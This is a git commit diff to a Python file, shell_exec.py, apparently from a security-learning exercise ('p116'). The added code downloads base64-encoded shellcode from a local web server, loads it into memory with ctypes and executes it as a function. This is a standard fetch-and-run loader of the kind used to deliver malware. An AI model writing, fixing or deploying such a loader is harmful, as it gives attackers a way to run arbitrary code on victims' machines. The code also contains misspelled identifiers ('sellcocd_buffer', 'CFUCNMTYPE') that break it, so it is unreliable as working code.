b36fd07b8bf7de77d11f8cfe52d17c3d2006532e
n1cfury <fukugetin@gmail.com>
2017-02-25 17:09:26 -0800

    Code Completed.  TEST and DEBUG

--- shell_exec.py
+++ shell_exec.py
@@ -1,7 +1,14 @@
-
+import urllib2, ctypes, base64
 
 def banner():
 	print "[***]	Python Shellcode execution p116		[***]"
+
+url = "http://localhost:8000/shellcode.bin"
+response = urllib2.urlopen(url)
+shellcode = base64.b64decode(response.read())
+shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
+shellcode_func = ctypes.cast(sellcocd_buffer, ctypes.CFUCNMTYPE(ctypes.c_void_p))
+shellcode_func()
 
 
 def main():
